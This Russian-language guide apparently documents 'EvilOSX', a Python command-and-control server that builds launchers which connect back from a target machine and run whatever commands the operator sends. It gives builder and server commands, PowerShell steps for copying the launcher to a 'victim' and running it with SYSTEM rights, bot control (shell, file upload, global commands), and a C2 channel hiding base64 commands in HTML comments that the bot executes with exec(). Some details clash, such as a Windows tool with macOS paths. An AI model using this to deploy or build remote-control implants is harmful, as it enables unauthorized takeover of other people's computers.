## Введение

**EvilOSX** — это локальный C2 (Command & Control) сервер для Windows, написанный на Python 3.9+. Он предназначен для создания загрузчиков (launchers), которые при выполнении на целевой машине подключаются к вашему серверу и получают команды удалённого управления.

> **Важно:** EvilOSX работает локально — он не является полноценным RAT в стиле Metasploit или Cobalt Strike, а скорее «мини-контроллер», который помогает автоматизировать доставку модулей на целевые машины.

## Установка и настройка

### Минимальные требования

```
Python 3.9+
Windows 10/11
pip (управление зависимостями)
```

### Установка зависимостей

```bash
pip install -r requirements.txt
```

**Зависимости:**

- `aiohttp>=3.8.0` — асинхронный HTTP-сервер (обработчик запросов от ботов)
- `aiosqlite>=1.1.0` — опциональный async SQLite драйвер
- `pycryptodomex>=3.17.0` — шифрование payload'ов (AES-256-CBC)
- `urwid`, `pyside2`, `future`, `typing` — для GUI интерфейса

### Структура проекта

```
EvilOSX/
├── server/           # C2 сервер
│   ├── model.py      # SQLite модель + кэширование + connection pool
│   └── handler.py    # Async HTTP обработчик запросов ботов
├── bot/              # Загрузчики (launchers) и модули
│   ├── launchers/    # python3, powershell.exe, etc.
│   └── loaders/      # install.py для каждого загрузчика
├── data/             # SQLite БД + сгенерированные загрузчики
├── start.py          # Точка входа (CLI / builder)
└── requirements.txt  # Зависимости
```

## Запуск сервера

### Интерактивный режим (GUI)

```bash
python start.py
```

Вам будут предложены:
- **Server host** — адрес, на котором будет работать C2 (по умолчанию `127.0.0.1`)
- **Server port** — порт (по умолчанию `8888`)
- **Program directory** — куда писать сгенерированные загрузчики (пусто = автовыбор в `~/Library/Containers/.<RANDOM>`)
- **Выбор launchera** — 0 = python3 по умолчанию, другие варианты: `powershell.exe`, `cmd.exe` и т.д.

После нажатия Enter сервер запустится. В консоли вы увидите логи подключения ботов:

```
[INFO] Server listening on http://127.0.0.1:8888/
[BOT JOINED] user@WORKSTATION uid=abc123 (startup delay: 0.42s)
[BOT HEARTBEAT] user@WORKSTATION
```

### CLI режим (без GUI)

Если у вас нет графического интерфейса, используйте аргументы:

```bash
python start.py --port 8888 --host 127.0.0.1
```

Или без указания порта (автоматический выбор):

```bash
python start.py --cli
```

### Проверка запуска

Сервер должен слушать на порту `8888`:

```powershell
Get-NetTCPConnection -LocalPort 8888 | Select-Object LocalAddress,LocalPort,OwningProcess
```

Если вы видите соединение — сервер работает.

## Создание загрузчика (launcher)

### Через интерактивный режим

Запустите `python start.py` и выберите опцию **Builder** в меню. Вам будут предложены:

- **Server host/port** — куда боты должны подключаться
- **Loader options** — параметры, которые передаются в загрузчик (например, путь к программе)

После выбора параметров вы получите файл вроде `data/builds/Launcher-abc123.exe`.

### Через CLI

```bash
python start.py --port 8888 --host 0.0.0.0 --builder
```

Это создаст загрузчик в папке `data/builds/` с уникальным именем.

### Структура сгенерированного файла

Загрузчик — это Python-скрипт (упакованный в `.exe` через PyInstaller или просто `.py`), который:

1. Генерирует уникальный UID
2. Подключается к C2 по адресу `http://<host>:<port>/`
3. Отправляет запрос с кукой `session=<uid>-<base64(json)>`
4. Получает команду и исполняет её

## Развертывание на целевой системе

### Метод 1: Прямое выполнение файла

Если вы сгенерировали загрузчик через builder, просто скопируйте его на целевую машину и запустите:

```bash
C:\Users\novra\Desktop\EvilOSX\data\builds\Launcher-abc123.exe
```

Загрузчик:
- Генерирует UID
- Подключается к `http://127.0.0.1:8888/` (или указанному хосту)
- Получает команду и исполняет её

### Метод 2: Через PowerShell

```powershell
# На сервере сгенерировать загрузчик
python start.py --port 8888 --host 0.0.0.0 --builder

# Скопировать на жертву (например, через RDP, SMB или USB)
Copy-Item "C:\Users\novra\Desktop\EvilOSX\data\builds\Launcher-xyz789.exe" "C:\Temp\"

# Запустить с правами SYSTEM (если нужно):
Start-Process -FilePath "C:\Temp\Launcher-xyz789.exe" -ArgumentList "--system"
```

### Метод 3: Через PowerShell Runspace + загрузчик

Если вы хотите, чтобы загрузчик был запущен **прямо из PowerShell**, используйте следующий подход:

1. Сгенерируйте загрузчик на сервере (он будет в `data/builds/`).
2. Перекиньте его на жертву.
3. Запустите через `Start-Process` или прямо из PowerShell:

```powershell
$launcher = "C:\Temp\Launcher-xyz789.exe"
Start-Process $launcher -ArgumentList "--system"
```

## Управление ботами

### Просмотр подключённых ботов

В GUI (если вы запустили через `python start.py` без аргументов) вы видите таблицу:

| UID | Username | Hostname | Last Online | System Version | Loader Name |
|-----|----------|----------|-------------|-----------------|--------------|
| abc123 | user@WORKSTATION | WORKSTATION | 0.42s ago | Windows 10 Pro | python3 |

### Отправка команд

В GUI есть кнопки для каждого бота:

- **Shell** — открыть встроенную консоль (использует `subprocess` под капотом)
- **Module exec** — запуск модуля с параметрами
- **Upload file** — отправка файла на целевую машину
- **Kill** — закрыть соединение и удалить бота из БД

### Глобальные команды

Через GUI можно задать глобальную команду, которая будет отправляться всем подключённым ботам. Это реализуется через таблицу `global_command` в SQLite.

## Архитектура и жизненный цикл

### Схема взаимодействия

```
┌─────────────┐         ┌──────────────┐
│  Attacker   │  HTTP    │    Bots      │
│   Machine   │ <────>   │   Network     │
└─────────────┘         └──────┬────────┘
                               │
                    ┌──────────▼──────────┐
                    │   EvilOSX Server    │
                    │  (C2 Controller)    │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              │                │                │
         Module A        Module B         Module C
      (file upload)     (shell)          (module exec)
```

### Жизненный цикл бота

1. **Stage 1** — загрузчик запускается → отправляет `GET /?type=0&payload_options=...` → сервер отвечает шифрованным payload'ом.
2. **Подключение к C2** — бот делает GET запрос к `/`, сервер возвращает HTML с скрытым командным блоком:

   ```html
   <!--DEBUG:base64(command_bytes)-->
   ```

3. **Парсинг** — бот извлекает `<!--DEBUG:...-->`, декодирует base64, исполняет команду через `exec()`.
4. **Heartbeat** — каждые 60 секунд бот делает GET к `/` для обновления статуса "online".

### Шифрование payload'ов

Payload шифруется с помощью AES-256-CBC:

```python
def _openssl_encrypt(password, plaintext):
    salt = get_random_bytes(8)
    key_iv = MD5.new(password + salt).digest()
    # ... derivation of 40-byte key+iv ...
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(salt + cipher.encrypt(padded_plaintext)).decode()
```

UID бота используется как пароль для шифрования. Это значит: **каждый бот имеет свой уникальный ключ**, и сервер знает UID заранее (генерируется при создании загрузчика).

## Троллинговые функции

### Встроенный троллинг-режим

В модуле `bot/modules/troll.py` реализованы следующие функции:

| Функция | Описание |
|---------|----------|
| `make_loud()` | Включает громкую речь (использует `pyttsx3`) |
| `change_volume()` | Меняет громкость звука |
| `play_sound()` | Воспроизводит звук из файла |

Пример:

```python
import troll as t

t.make_loud()  # включаем громкую речь
time.sleep(5)
t.change_volume(-20)  # снижаем громкость
t.play_sound("C:\\Windows\\Media\\Chime.wav")  # воспроизводим звук
```

### Встроенный троллинг-сервер (т.н. «троллинг-бот»)

Это отдельная утилита, которая:

1. Запускается на сервере.
2. Приходит с `localhost` и подключается к C2 по вашему порту.
3. Получает команду (например, `play_sound("C:\\Windows\\Media\\Chime.wav")`).
4. Выполняет её через локальный экземпляр Python.

**Важно:** этот троллинг-бот **не является полноценным RAT'ом**, он просто выполняет команды, которые приходят с сервера. Он не может подключаться к удалённым машинам напрямую — только получать команды от C2.

## Безопасность и рекомендации

### Рекомендации по использованию

1. **Не используйте EvilOSX для атак на критическую инфраструктуру** — он не предназначен для таких целей, но может быть использован как учебный инструмент.
2. **Храните UID ботов в секрете** — они используются как ключи шифрования. Если злодей узнает UID, он сможет подделать запросы от имени вашего бота.
3. **Используйте аутентификацию по куке** — сервер проверяет, что кука соответствует реальному боту (UID + данные).
4. **Регулярно обновляйте зависимости** — некоторые библиотеки (например, `pycryptodomex`) могут содержать уязвимости.

### Архитектурные решения для безопасности

- **Connection pooling**: 2 постоянных SQLite подключения вместо открытия на каждый запрос → меньше времени, когда БД «висит» открытой.
- **Read-through cache**: частые запросы (`is_known_bot`, `get_global_command`) кэшируются с TTL=60с → снижает нагрузку на БД.
- **Batched writes**: 5–10 операций собираются в батч перед commit'ом → снижает конкуренцию за RLock.

> **Примечание:** EvilOSX не предназначен для работы в качестве полноценного C2-сервера против больших сетей — он скорее учебный проект с акцентом на простоту и производительность.
